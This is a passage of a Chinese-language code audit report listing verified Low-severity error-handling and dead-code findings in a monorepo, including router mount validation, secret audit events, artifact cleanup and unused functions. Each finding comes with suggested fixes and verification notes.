- **位置**: [`packages/router/src/routeCodec.ts:441`](packages/router/src/routeCodec.ts#L441)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-workspace-sync-router`

**详情**: `validateCanonicalRouteManifestStructure` 通过遍历宿主树*以及*每个 module 树来填充同一个 `routePathsById` 映射(routeCodec.ts:413-421),随后用 `!routePathsById.has(mount.parentRouteNodeId)` 校验 `mount.parentRouteNodeId`(第 441 行)。因此,父节点仅存在于某个 module 内部的 mount 也能通过解码。`composeRouteManifestWithModules` 只在宿主树中解析父节点(`findRouteNodeById(root, parentRouteNodeId)`,routeCore.ts:555),并把 `{reason: 'missing-parent'}` 推入 `skippedMounts`。`validateRouteManifest` 根本不检查 `mounts`,而 `contributeRouteMount` 只在 `hostRouteNodeIds.has(parentRouteNodeId)` 时才发出父引用(routeSemanticContributionProvider.ts:479-481),因此 Semantic Index 同样保持沉默。结果是一处失败放行的校验缺口:manifest 解码和校验都干干净净,但整个路由 module 静默地从未挂载,Issues 中也没有任何诊断。

**失败场景**: 某 manifest 声明了 module `account`,其根节点为 `acct-root`、子节点为 `acct-profile`,并带有 `mounts: [{mountId:'mt', moduleRef:'account', parentRouteNodeId:'acct-profile', mountPath:'settings'}]`。`decodeRouteManifest` 成功,因为 `acct-profile` 存在于 `routePathsById` 中(遍历 module 树时被加入)。`composeRouteManifestWithModules` 随后无法在宿主树中找到 `acct-profile`,于是记录 `skippedMounts: [{mountId:'mt', reason:'missing-parent'}]`。该 module 下的所有路由都不可达,`validateRouteManifest` 返回零条 issue,作者看到的是一个干净的 manifest,却永久缺失路由。

**修复建议**: 用一个与 module 树 id 分离的映射来跟踪宿主树节点 id(遍历过程本来就知道当前处于哪棵树),并只用宿主树映射校验 `mount.parentRouteNodeId`。此外,从 `validateRouteManifest` 中把 `ComposedRouteManifest.skippedMounts` 暴露为 RTE 诊断,使被丢弃的 mount 不再静默。

**验证备注**: 证据吻合(routeCodec.ts:439-447;单一的 routePathsById 映射由 walk() 先遍历 manifest.root、再遍历每个 module 根填充,见 routeCodec.ts:413-421)。我执行了完全相同的场景:module 'account' 含 acct-root/acct-profile,并带 mounts:[{mountId:'mt',moduleRef:'account',parentRouteNodeId:'acct-profile',mountPath:'settings'}] —— decodeRouteManifest 成功,composeRouteManifestWithModules 返回 skippedMounts [{mountId:'mt',reason:'missing-parent'}](findRouteNodeById 只查宿主树,routeCore.ts:555),而 validateRouteManifest 返回 []。服务端存在同样的失败放行:apps/backend/internal/modules/workspace/route_manifest_validator.go 用宿主根和每个 module 根构建同一个 `routeIDs` 映射,然后用它检查 mount.ParentRouteNodeID(RTE-5006),因此 canonical 持久化层同样接受它。该主张有一处夸大:诊断其实是存在的 —— packages/prodivix-compiler/src/export/routeTopology.ts:250/155-165 会把每个被跳过的 mount 转成 error 级别的 RTE-5001 编译诊断,因此导出/编译阶段确实会拦截;该主张仅对编辑器 Issues 界面成立,而后者根本没有路由 provider(apps/web/src/editor/features/issues 只包含 animation/code provider)。严重级别由 medium 下调为 low:属于创作期静默与预览路由缺失,在导出/生产之前会以 error 形式被捕获,不会造成数据丢失。

##### L-EH-14 只要 secret 消费方拒绝或租约在消费过程中过期,secret-binding-used 审计事件就会被跳过

- **位置**: [`packages/runtime-core/src/executionEnvironmentResolution.ts:579`](packages/runtime-core/src/executionEnvironmentResolution.ts#L579)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-runtime-core`

**详情**: `useSecret` 把解析出的 secret 材料交给 `consumer(material)`,只有在 consumer 完成并通过第二次 `requireActive()` 检查*之后*才发出 `secret-binding-used` 审计事件。如果 `consumer` 拒绝(reject),或者租约在 consumer 等待期间过期,拒绝/抛出的异常会从 `useSecret` 传播出去,而 `audit('secret-binding-used', binding)` 永远不会执行 —— 尽管 secret 已经被释放给了 consumer,并且可能已经被送上网络。同级的 `readPublicBinding` 是在返回值*之前*审计的(第 554 行),因此同一个租约对象内部的顺序并不一致。这里没有 `finally`、没有 catch,也没有补偿性的 'secret-binding-attempted' 事件,因此审计轨迹恰恰在审计人员最需要的失败情形下静默地少报了 secret 的使用。

**失败场景**: 某个 Server Function 适配器调用 `lease.useSecret({bindingId:'access-token'}, 'authorization', async (material) => { await fetch(url, { headers: { Authorization: `Bearer ${material}` } }); })`。上游主机不可达,`fetch` 在请求已经发出之后拒绝。`await consumer(material)` 抛出异常,`useSecret` 把拒绝向上传播,`input.publishAudit` 只收到 `lease-issued` —— 对于一个已被解析、注入到请求头并发送出去的 secret,不存在任何 `secret-binding-used` 记录。基于审计流的合规查询会报告该令牌从未被使用。

**修复建议**: 在调用 consumer 之前立即发出 `secret-binding-used` 审计事件(与 `readPublicBinding` 保持一致),或者把 consumer 调用包进 `try { await consumer(material); } finally { audit('secret-binding-used', binding); }`,使材料的释放总能被记录。

**验证备注**: 代码与引用一致,位于 executionEnvironmentResolution.ts:579-581:'await consumer(material); requireActive(); audit("secret-binding-used", binding);',既没有 try/finally,也没有补偿性的 attempted 事件,而 readPublicBinding 在第 554 行是先审计再返回。可达的形态是真实的 —— packages/data-http/src/dataHttpAdapter.ts:696-712 在 consumer 内部执行网络传输(response = await executeTransport(material)),因此在发送之后发生的拒绝会跳过审计;审查者仅隐含提到的更强变体同样成立:一次完全成功的消费,如果租约在 await 期间到期使第 580 行的 requireActive() 抛出 leaseExpired,其审计也会丢失。严重级别从 medium 下调:publishAudit 是一个可选钩子(第 500 行的 input.publishAudit?.),在整个仓库中没有任何生产端提供方 —— git grep 只在 dataHttpAdapter.test.ts、dataRuntime.test.ts 和 executionEnvironmentResolution.test.ts 中找到它 —— 而且 createExecutionEnvironmentResolutionService 本身也只在测试中被实例化。该路径不会泄露任何 secret 材料,失败会通过传播的拒绝明确地暴露给调用方;今天它只能少报一条生产中无人消费的审计流。

##### L-EH-15 control plane 的保留期清理器把每次失败都转成成功且不记录日志,导致过期 artifact 与终端状态永远静默堆积

- **位置**: [`apps/remote-runner-control-plane/src/main.ts:396`](apps/remote-runner-control-plane/src/main.ts#L396)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-runner-cp-hosts`

**详情**: `controlPlane.sweepExpiredArtifacts()` 和 `terminalBroker.sweepExpired()` 是过期 artifact blob/授权以及已封存终端状态的唯一保留期回收机制(数据库侧没有 TTL 作业)。它们的合并结果被 `.catch(() => 0)` 接住,错误对象被完全丢弃。control plane 进程没有 logger、没有指标,也没有 `process.on('unhandledRejection')`/退出路径,因此持续失败的清理完全不可见:定时器继续触发、继续失败,并继续报告一个被丢弃的 `0`。此外这两个 await 是串行的,因此 `sweepExpiredArtifacts` 的失败还会让 `terminalBroker.sweepExpired()` 永远无法运行。

**失败场景**: 一次 Postgres 权限变更、迁移漂移或语句超时,使 `sweepExpiredArtifacts` 每次调用都拒绝。每 60 秒一次的 tick 中,IIFE 拒绝,`.catch(() => 0)` 吞掉它,`sweepBusy` 复位,进程在 stdout/stderr 上不输出任何内容,`/healthz` 与 `/readyz` 也不暴露任何失败(两者仍返回 200/ready)。`remote_execution_artifact_blobs`、`remote_execution_artifact_grants` 和 `remote_execution_terminal_states` 无界增长——超出其 `expiresAt` 契约地保留过期执行输出和已封存的终端记录——而运维人员看到的第一个症状是磁盘耗尽。

**修复建议**: 把失败暴露出来:用一个将非机密失败信息写入 stderr 的处理函数(或递增一个供 `/readyz` 查询的计数器)替换 `.catch(() => 0)`,并用 `Promise.allSettled` 运行这两次清理,使其中一个失败不会阻塞另一个。

**验证备注**: 已核对 main.ts:382-399:清理 IIFE 的结果被 `.catch(() => 0)` 接住,错误对象被丢弃。对 apps/remote-runner-control-plane/src 执行 `grep -rn 'console\.|logger|unhandledRejection'` 返回零个非测试命中,因此任何地方都不会输出内容。`/healthz`(httpHandler.ts:295-298)无条件返回 200,`/readyz`(299-313)只反映区域流量闸门,因此两者都不呈现清理健康状况。串行 await 这一点也正确:`(await controlPlane.sweepExpiredArtifacts(...)) + (await terminalBroker.sweepExpired())` 意味着第一个拒绝会阻止第二个运行。我确认这些是仅有的常规保留期路径(`sweepExpired` 的另一个调用方是区域恢复算子,属于故障转移路径)。但数据暴露的说法被推翻:postgresExecutionRepository.ts:791-804 的 `getArtifact` 带有 `AND g.expires_at>$4` 过滤,remoteExecutionControlPlane.ts:563 带有 `candidate.expiresAt > now()` 过滤,因此无论清理是否运行,过期 artifact 都不可读,且终端状态在静态存储中是加密的。真实后果只是不可见的存储增长——没有正确性或机密性影响。严重级别由 medium 修正为 low。

##### L-EH-16 一次性 authority/secret 围栏的安全守卫证据来自一个裸 `catch {}`,任何读取失败都被当作已消费的证明

- **位置**: [`packages/golden-conformance/src/goldenG2AuthServerMatrix.ts:489`](packages/golden-conformance/src/goldenG2AuthServerMatrix.ts#L489)
- **类别**: error-handling ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `infra-gates`

**详情**: `runIsolatedProduction`、`runIsolatedSourceMutationProduction`(第 659 行)和 `runIsolatedSecretProduction`(第 860 行与第 867 行)确立 `authorityConsumed` 与 `secretMaterialConsumed` 这两个安全关键事实的唯一依据,都只是观察到 `readFile` 抛出了异常。任何错误 —— `EACCES`、`EPERM`、`EMFILE`、`EBUSY` —— 都会被转换为“隔离运行时已删除一次性 authority/secret 材料”的肯定断言。一致性测试把这些结论当作硬性守卫来断言(`goldenG2AuthServerMatrix.conformance.test.ts:224`、`:260`、`:288`、`:334`、`:384`),也就是说这道守卫的设计意图是失败关闭,但其证据采集却是失败放行。`runIsolatedSecretProduction` 在第 866 行进一步放大了这个问题:它以 `authorityConsumed = input.permissions === undefined` 作为初值,即在根本没有写入 authority 文件时,不经任何观察就断言围栏成立。

**失败场景**: `runGoldenG2AuthServerMatrix` 在 `Promise.all` 下并发运行六个隔离的 Node 子进程(1044-1081 行),每个都在 `process.cwd()` 下写入/读取临时目录树。如果 harness 进程在调用 `readFile(authorityPath)` 时遇到 `EMFILE`/`EACCES`,而隔离函数实际上把 `/.prodivix/server-function-authority.json` 留在了磁盘上,那么 `authorityConsumed` 会被记录为 `true`,`G2 Golden Auth/Server` 守卫就会为一个泄漏了可重用 authority token 的运行时报告“一次性 authority 围栏通过”。

**修复建议**: 在设置该标志前把 catch 收窄到 `ENOENT`(`if ((error as NodeJS.ErrnoException).code !== 'ENOENT') throw error;`),并去掉 `input.permissions === undefined` 这个默认值,使围栏只有在观察到确实删除时才被报告为满足。

**验证备注**: 引用的代码在所标注的行上完全一致:489-493(runIsolatedProduction)、659-663(runIsolatedSourceMutationProduction)、860-864(secretMaterialConsumed)以及 866(`let authorityConsumed = input.permissions === undefined;`)。`catch {}` 确实把任何 errno(而不仅是 ENOENT)当作一次性消费的证明,一致性测试在 224、260、288、334、384 行硬性断言这些布尔值;对六个隔离子进程的 Promise.all 也确实位于 1044-1081 行。因此失败放行的证据采集问题是真实的。但该结论中有两处被夸大了。(a)关于第 866 行的“进一步放大”子结论是错误的:`isolatedProductionSecret` 是唯一 `permissions` 为 undefined 的调用,而 1251-1255 行的矩阵映射只为它暴露 `secretMaterialConsumed` —— 它被赋初值的 `authorityConsumed` 从未被暴露或断言。唯一被断言的用例(`isolatedWorkspaceReadSecret`,第 334 行)传入了 `permissions: ['workspace.owner','workspace.read']`,因此走的是真实的 `if (input.permissions)` readFile 分支。(b)EMFILE/EACCES 场景属于推测:每个根目录都是同一个 harness 进程在 process.cwd() 下用 `mkdtemp` 创建并写入的,await 的 execFileAsync 保证子进程已退出,而且只有六个子进程,因此非 ENOENT 的读取失败并不是现实路径。这是一个测试 harness 的健壮性缺陷(应当断言 `error.code === 'ENOENT'`),局限在 packages/golden-conformance 内部,不具备生产可达性。严重程度由 medium 下调为 low。

#### 4.4.3 死代码(dead-code)

##### L-DC-01 Animation binding 的增删改查以及约 980 行动画面板组件是不可达的死代码

- **位置**: [`apps/web/src/editor/features/animation/panels/AnimationEditorBindingsPanel.tsx:91`](apps/web/src/editor/features/animation/panels/AnimationEditorBindingsPanel.tsx#L91)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-code-anim-graph`

**详情**: `AnimationEditorBindingsPanel`(224 行)、`AnimationEditorTimelinesPanel`(82 行)和 `AnimationEditorSvgFilterLibraryPanel`(166 行)虽已导出,但仓库中无人导入;`AnimationEditorBindingCard`(200 行)和 `AnimationEditorTrackCard`(312 行)只能通过已死的 `AnimationEditorBindingsPanel` 到达。唯一被渲染的动画界面是 `AnimationEditorContent` -> `AnimationEditorInspectorPanel`,而它的 binding 区块是只读的(AnimationEditorInspectorPanel.tsx:451-467)。因此 `useAnimationEditorState` 返回的 `addBinding`、`deleteBinding`、`updateBindingTarget` 和 `toggleTrackExpanded` 没有任何消费方。`addBinding` 的写法本身还有错误:它在 `setAnimation` updater 内部捕获所创建的 id(`createdId = nextBinding.id`)并在下一行返回,与 NodeGraph 处理器相同的“updater 非同步”反模式,因此一旦被接入,它会返回 `null`。

**失败场景**: 用户创建一个新的 Animation 文档(`createEmptyAnimationDefinition` -> `timelines: []`)并添加一条时间轴(`createDefaultTimeline` -> `bindings: []`)。Inspector 的 binding `<select>` 为空,渲染树中任何位置都没有添加 binding 的控件,于是 `binding` 始终为 `undefined`,受 `{binding ? ... : null}` 守卫的“Add style/filter/svg track”按钮永远不渲染,关键帧编辑器也永远不渲染。该动画只能通过切换到 Blueprint inspector(useBlueprintEditorInspectorController.ts:972)才能获得内容,那是另一处唯一的 `createDefaultBinding` 调用点。

**修复建议**: 要么把 `AnimationEditorBindingsPanel`/`AnimationEditorTimelinesPanel`/`AnimationEditorSvgFilterLibraryPanel` 接入 `AnimationEditorContent`(并修正 `addBinding`,在状态 updater 之外生成 id),要么删除这五个未使用的面板文件,连同 `useAnimationEditorState` 中现已无人使用的 `addBinding`/`deleteBinding`/`updateBindingTarget`/`toggleTrackExpanded` 成员一并删除。

**验证备注**: 通过对整个仓库执行 git grep 已验证:AnimationEditorBindingsPanel、AnimationEditorTimelinesPanel 和 AnimationEditorSvgFilterLibraryPanel 在任何地方都没有导入方(测试中也没有);AnimationEditorBindingCard 只在 AnimationEditorBindingsPanel.tsx:8 被导入,AnimationEditorTrackCard 只在 AnimationEditorBindingCard.tsx:7 被导入,因此两者都只能通过那个已死的面板到达。行数与结论相符(224/82/166/200/312 = 984)。AnimationEditorContent.tsx:61-107 对 useAnimationEditorState 解构时没有取 addBinding/deleteBinding/updateBindingTarget/toggleTrackExpanded,而 useAnimationEditorState.ts:1266-1269 是它们仅有的另一处出现位置,因此这四个成员都无人消费。被渲染的 binding 区块(AnimationEditorInspectorPanel.tsx:431-467)与引用完全一致且为只读:一个列出现有 binding 的 <select>,加上一个显示 binding.targetNodeId 的纯文本 div,没有任何新增/删除控件。新文档确实从空开始(AnimationEditor.tsx:199 createEmptyAnimationDefinition;animationCodec.ts:586-591 的 createDefaultTimeline 带有 bindings: []),而生产中唯一创建 binding 的入口是 Blueprint 控制器的 mountSelectedNodeToAnimation(useBlueprintEditorInspectorController.ts:962-1010)。没有任何机制能捕捉这些死代码:apps/web/eslint.config.js:21 关闭了 @typescript-eslint/no-unused-vars,apps/web/tsconfig.json 设置了 noUnusedLocals: false。修正审查者的两处夸大:(a) 引用的 prop 列表是错的——第 91 行真正解构的是 activeTimeline、activeTimelineDisplayName、cursorMs、nodeTargetOptions、svgFilters、expandedTrackIdSet,而不是 'timeline, nodeTargetOptions, ...';锚定行本身是准确的,因此结论依然成立。(b)“会返回 null”的断言按其陈述并不成立:setAnimation 是普通的 useState setter(useAnimationEditorState.ts:62),而 React 的 dispatchSetState 会在该 hook 没有待处理 lane 时通过 lastRenderedReducer 急切求值 updater,因此在常见的单次更新事件处理路径中,`return createdId` 之前 createdId 事实上已被赋值。这个模式是非确定性的,而不是必然返回 null,何况它本来就不可达。严重度下调为 low:这只是维护债务——未被导入的模块会被 tree-shaking 从生产包中移除,没有数据损坏,而且 binding 的创建之所以由 Blueprint 的“把节点挂载到动画”动作拥有,是因为 binding 本就是节点作用域的。

##### L-DC-02 Code 资源树构建器中的 `ensureFolder` 是死代码

- **位置**: [`apps/web/src/editor/features/code/workspaceCodeArtifacts.ts:38`](apps/web/src/editor/features/code/workspaceCodeArtifacts.ts#L38)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-code-anim-graph`

**详情**: `ensureFolder` 是模块私有的,自从 `buildCodeResourceTreeFromWorkspaceVfs` 被改写为直接依据 Workspace VFS 树(`treeById`/`treeRootId`)构建文件夹之后就再无引用。它仍然实现了另一套由路径字符串派生的文件夹物化策略(`foldersByPath`、`parentPath || 'code'`),该策略已不再匹配现行代码路径所使用的、以 VFS 节点 id 为键的模型,因此把它留在原地等于诱使今后的调用方重新引入文件夹节点标识的重复所有者。

**失败场景**: `git grep ensureFolder` 只返回 workspaceCodeArtifacts.ts:38 处的定义,没有任何调用点;该函数被编译进产物却从不执行。一旦维护者复用它,就会创建 `id` 为路径字符串的文件夹节点,与 `findCodeResourceNodeById`/`isWorkspaceVfsFolder` 所依赖的、以 VFS 节点 id 为键的 `workspace-vfs` 文件夹节点发生冲突。

**修复建议**: 删除 `ensureFolder`(如果 `createCodeResourceFolderNode` 未被使用的 `source = 'workspace-document'` 默认值也随之不再使用,一并删除)。

**验证备注**: 对整个仓库执行 `git grep ensureFolder` 只返回一处命中,即 apps/web/src/editor/features/code/workspaceCodeArtifacts.ts:38 的定义——apps、packages、scripts 和测试中都没有调用点。引用的证据与第 38-43 行完全一致。该函数是模块私有的(const,未导出),因此从外部也无法到达。没有任何工具会标记它:apps/web/eslint.config.js:21 把 @typescript-eslint/no-unused-vars 设为 'off',apps/web/tsconfig.json 设置了 noUnusedLocals: false(启用 noUnusedLocals 的根 tsconfig.app.json 并未被指向 apps/web 的根 tsconfig.json 引用)。所声称的标识不匹配是真实的:ensureFolder 调用 createCodeResourceFolderNode(path, name, path, parent?.id ?? null),使用默认 source 'workspace-document',产出路径字符串形式的 id;而现行的 buildCodeResourceTreeFromWorkspaceVfs 在第 137-143 行传入 node.id 且 source 为 'workspace-vfs',同时 CodeAuthoringWorkspace.tsx:1106 和 :1142 以 isWorkspaceVfsFolder(source === 'workspace-vfs')对 parentNodeId 设门禁,因此重新引入的调用方会产出静默无法通过该门禁的文件夹节点。失败场景中有一处不准确:“该函数被编译进产物”是错的——ES 模块中未被引用的模块私有箭头函数常量会被 Rollup/Vite 的 tree-shaking 丢弃,因此运行时零成本。这反而进一步支持 low 严重度:纯粹的维护债务,没有运行时、正确性或数据方面的影响。

##### L-DC-03 resources/export 模型中未被使用的导出辅助函数属于生产环境死代码

- **位置**: [`apps/web/src/editor/features/resources/publicResourceModel.ts:75`](apps/web/src/editor/features/resources/publicResourceModel.ts#L75)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-resources-issues`

**详情**: `resolveCreatedPublicNodeId`(publicResourceModel.ts:75)和 `shouldReadPublicFileText`(publicResourceModel.ts:93)在整个仓库中没有任何导入方——对 `apps/web` 和 `packages` 执行 `git grep` 只匹配到它们自身的定义处。`apps/web/src/editor/features/export/exportCodeModel.ts:20` 中的 `EXPORT_AUDIT_FILE_PATHS` 同样如此,它声明了 `.prodivix/export-manifest.json` / `origins.json` / `licenses.json` 这些路径,而没有任何导出代码路径产出或消费它们。它们编码了一些假设(通过树差异发现新建节点、文本读取启发式、导出审计文件布局),这些假设已不再与任何行为相连,会静默地与真实流程发生偏离。

**失败场景**: 未来的贡献者读到 `EXPORT_AUDIT_FILE_PATHS` 时会合理地得出结论:ZIP 导出会写入 `.prodivix/export-manifest.json`;实际上 `downloadProjectZip`(ExportCode.tsx:415-452)只写入编译器 bundle 文件,因此基于该常量建立的审计预期从一开始就是错的。同样地,`resolveCreatedPublicNodeId` 实现了一种树差异选择策略,而当前的 `createAssetDocument` 路径已用显式的 `documentId` 取代了它。

**修复建议**: 删除这三个未被使用的导出(以及仅服务于 `resolveCreatedPublicNodeId` 的 `collectNodeIds`);如果审计文件仍在计划之内,则把 `EXPORT_AUDIT_FILE_PATHS` 接入 ZIP 导出。

**验证备注**: 核心论断已验证。对 resolveCreatedPublicNodeId、shouldReadPublicFileText 和 EXPORT_AUDIT_FILE_PATHS 执行全仓库 `git grep`(整个工作树,而非仅 apps/web)只返回三处定义位置:publicResourceModel.ts:75、publicResourceModel.ts:93 和 exportCodeModel.ts:20。不存在 barrel 再导出:PublicResourcePage.tsx:17-25 导入了 createPublicTemplateByKind、formatPublicResourceBytes、getDefaultPublicFileTemplate、getResourceManagerPublicSelectionStorageKey、isSvgFileNode、isTextLikeNode 和 PublicFileKind,但没有导入这两个辅助函数;ExportCode.tsx:22-28 导入了 buildFileTree、resolveCodeViewerLanguage、resolveProjectFileLanguage、sanitizeExportFileName 和两个类型,但没有导入该常量。关于 resolveCreatedPublicNodeId 被取代的判断也成立:createAssetDocument(PublicResourcePage.tsx:410-473)通过 createWorkspaceResourceDocumentId 推导出显式的 documentId,并调用 setSelectedNodeId(documentId)/setActiveDocumentId(documentId),因此树差异发现策略已无任何调用方。不过其中一条支撑性陈述被证伪,报告该发现时应剔除:所谓 EXPORT_AUDIT_FILE_PATHS 声明的路径“没有任何导出代码路径产出或消费”是不成立的。packages/prodivix-compiler/src/export/planner.ts 恰好产出了这三条路径(第 437 行 '.prodivix/export-manifest.json',第 742 行 '.prodivix/origins.json',第 748 行 '.prodivix/licenses.json'),而且 packages/golden-conformance/src/goldenApp.conformance.test.ts:112 以及 planner.test.ts:183,333 对它们做了断言,因此该常量的取值是正确的,并未偏离。唯一成立的部分是:Web 的 ZIP 路径(downloadProjectZip,ExportCode.tsx:414-450)基于 generateWorkspaceReactViteBundle/generateWorkspaceVueViteBundle 构建,而非 ExportProgram planner,因此这些文件不在该特定 bundle 中。综合来看:三个确实无人引用的导出生产符号(死代码 / 编译器已拥有的重复字符串字面量),仅影响可维护性,无运行时或数据影响,因此 low 是站得住脚的严重级别。

##### L-DC-04 Web 应用中仍有九个被 git 跟踪的空源文件作为死占位符残留

- **位置**: [`apps/web/src/pir/index.ts:1`](apps/web/src/pir/index.ts#L1)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-plugins-shell`

**详情**: `apps/web/src/pir/index.ts`、`apps/web/src/pir/ast/astParser.ts`、`apps/web/src/pir/converter/astToPIR.ts`、`apps/web/src/pir/schema/pir.types.ts`、`apps/web/src/debug/index.ts`、`apps/web/src/debug/breakpoints/breakpointStore.ts`、`apps/web/src/debug/stateMonitor/stateMonitor.ts`、`apps/web/src/debug/timeline/timeline.ts` 和 `apps/web/src/debug/variables/variableView.ts` 全部为零字节且无任何导入方(在 apps/web 上对 `pir/ast/astParser`、`pir/converter/astToPIR`、`pir/schema/pir.types`、`from '@/pir'` 执行 `git grep` 无任何结果)。尤其是 `pir/ast` 和 `pir/converter` 这两个名字宣示了一条已不存在的 Web 自有 AST→PIR 路径,与“PIR 领域语义位于 `@prodivix/pir`”的规则相矛盾。

**失败场景**: 一位贡献者去找 Web 的 AST→PIR 适配器,打开 `apps/web/src/pir/converter/astToPIR.ts` 发现是空的,无法判断该模块是尚未实现、已被删除,还是位置不对;而一条误写的 `import ... from '@/pir'` 会编译成空,在运行时静默产出 `undefined`,而不是抛出解析错误。

**修复建议**: 删除这九个空文件(以及随之变空的 `pir/ast`、`pir/converter`、`pir/schema`、`debug/*` 目录),或者把它们实现出来。如果 `@/pir` 本意是一个 barrel,就从其中显式再导出 `createPirWebRendererHost`/`createPublishedPirProjection`。

**验证备注**: 这九个文件都被 git 跟踪(`git ls-files apps/web/src/pir apps/web/src/debug`)且大小恰为 0 字节:pir/index.ts、pir/ast/astParser.ts、pir/converter/astToPIR.ts、pir/schema/pir.types.ts、debug/index.ts、debug/breakpoints/breakpointStore.ts、debug/stateMonitor/stateMonitor.ts、debug/timeline/timeline.ts、debug/variables/variableView.ts。在 apps/web 上对 `from '@/pir'`、`from '@/debug`、`pir/ast/astParser`、`pir/converter/astToPIR`、`pir/schema/pir.types` 以及各 debug 子路径执行 `git grep` 均无命中——确实是孤立文件。失败场景中有一条子论断是错的:对空模块的任何具名导入 TypeScript 都会报错(“has no exported member”),不会静默产出 `undefined`。这一误读并不改变该发现的实质,它是无运行时或数据影响的表层死代码——low 是站得住脚的严重级别。

##### L-DC-05 Atomic Commit 重写之后 workspace 模块中残留约 15 个无人引用的私有函数

- **位置**: [`apps/backend/internal/modules/workspace/store_helpers.go:17`](apps/backend/internal/modules/workspace/store_helpers.go#L17)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-workspace`

**详情**: 对整个 apps/backend(生产与测试)执行 `git grep`,以下符号只找到定义、没有调用点:`queryWorkspaceDocumentsForUpdate`(store_helpers.go:17)、`queryWorkspaceRouteManifestForValidation`(:42)、`indexWorkspaceDocumentsAfterRemoval`(:56)、`validateWorkspaceDocumentRetention`(:74)、`insertWorkspaceOperation`(:81)、`commandDomain`(:215)、`resolveDocumentLookupError`(:245)、`validateOptionalJSONSafeRevision`(revision_limits.go:34)、`newWorkspaceRevisionConflictWithRoute`(store.go:101),以及整套按节点的变更 API `addDirectory`/`findDocumentNode`/`removeDocument`/`renameDocument`/`renameDirectory`/`removeDirectory`(vfs_tree_mutation.go:66-251)。它们是 Atomic Commit 之前的文档/树变更辅助函数;当前设计把每一次写入都改由 `workspaceCommitState` + JSON-Patch 投影承载。Go 不会对未使用的函数报错,因此它们会静默通过编译。除了维护成本之外,它们还是树变更的第二套、且已发生偏离的实现——第 240 行的 `removeDirectory` 在无 ok 检查的情况下解引用 `tree.TreeByID[*node.ParentID]`,若未来有调用方在不一致的树上使用它,就会写入空字符串键。

**失败场景**: 某位维护者在添加目录删除命令时,很自然地会去用 `tree.removeDirectory(nodeID)`,而不是把变更表达为 `/treeById` patch。这会绕过 `validateCommitWorkspacePatchPath`、`applyWorkspaceCommand` 中的正/反向可逆性检查,以及 `validateWorkspaceCommitChangesAgainstRequirements`,于是文档会在已声明的 revision 向量之外被移除——而这正是提交流水线存在的意义所在。`insertWorkspaceOperation` 同样会写入一行不带 `operation_id`/`request_hash` 的 `workspace_operations` 记录,从而破坏重放幂等性。

**修复建议**: 删除 vfs_tree_mutation.go 中除 `addDocument`(唯一存活入口,被 `defaultWorkspaceTreeWithDocumentJSON` 和 `parseWorkspaceVFSTree` 使用)之外的全部内容,并删除 store_helpers.go / revision_limits.go / store.go 中那七个无人引用的辅助函数。在 Go linter 配置中加入 `unused`,使这类残留在 CI 中直接失败。

**验证备注**: 引述证据与源码逐字吻合:store_helpers.go:17 正是所引述的 queryWorkspaceDocumentsForUpdate 签名,vfs_tree_mutation.go:218-222 以及第 240 行未加保护的 `parent := tree.TreeByID[*node.ParentID]` 也完全准确。对整个 apps/backend(含 _test.go)乃至整个仓库执行 `git grep`,15 个名字中有 14 个只返回定义处命中;唯一的例外是 findDocumentNode,它在 vfs_tree_mutation.go:114 和 :138 有调用方,但这两个调用方(removeDocument、renameDocument)本身也是死代码,因此它是传递性死代码。我不止依赖 grep,还排除了 Go 特有的规避情形(接口方法集满足、仅测试使用):我删除了全部 15 个函数,并在 apps/backend 下运行 `go build ./...`(通过)、`go vet ./internal/modules/workspace/`(通过)与 `go test ./internal/modules/workspace/`(ok,1.946s)。没有任何东西引用它们。随后仓库已恢复干净并重新构建成功。仓库中任何位置都不存在 .golangci.yml 或 staticcheck 配置,因此没有 `unused` 门禁能捕获这一情况,证实它们确实静默通过编译。insertWorkspaceOperation 这条子论断同样成立:database.go:164-168 添加了 operation_id/request_hash/result_json 以及部分唯一索引 idx_workspace_operations_workspace_operation_id ... WHERE operation_id IS NOT NULL;store_operation_commit.go:230 和 store_settings_commit.go:181 处的存活插入会填充全部三项,而 store_helpers.go:91 处的死辅助函数一项也不填;由于该索引是部分索引,operation_id 为 NULL 的行会完全逃过幂等性约束。removeDirectory 的未检查查表确属真实,且与其同级函数不对称:removeDocument(第 121 行)和 renameDirectory(第 203 行)都使用带守卫的 `parent, ok := ...`,而 removeDirectory 第 240 行没有,因此一个 ID == "" 的零值节点会在第 248 行被写回。该论断过度之处在于:失败场景在任何生产路径上都*不可达*——它明确以假想的未来调用方为前提,而唯一存活的写入路径(workspaceCommitState、validateCommitWorkspacePatchPath、applyWorkspaceCommand、validateWorkspaceCommitChangesAgainstRequirements,均已核实存在且在用)今天并未被绕过。该论断还略微错误地把 findDocumentNode 说成无人引用。这些不准确之处影响的是表述而非事实内核,而所声明的严重级别已处于最低档,这正是对不可达死代码(但仍违反项目 alpha 阶段的“无重复所有者”政策)的正确上限。

##### L-DC-06 main 中的 `defer server.Close()` 不可达,且进程没有信号处理或优雅关闭

- **位置**: [`apps/backend/cmd/server/main.go:19`](apps/backend/cmd/server/main.go#L19)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-platform`

**详情**: `server.Run()` 委托给 `gin.Engine.Run` -> `http.ListenAndServe`,后者永远不会返回 nil 错误。因此 `runErr` 恒为非 nil,`log.Fatal(runErr)` 必然执行,而 `log.Fatal` 会调用 `os.Exit(1)`,它不会执行 defer 函数。第 19 行注册的延迟清理在任何代码路径上都无法执行。代码中也没有任何 `signal.Notify` / `http.Server.Shutdown`,因此 SIGTERM 会立即终止进程。

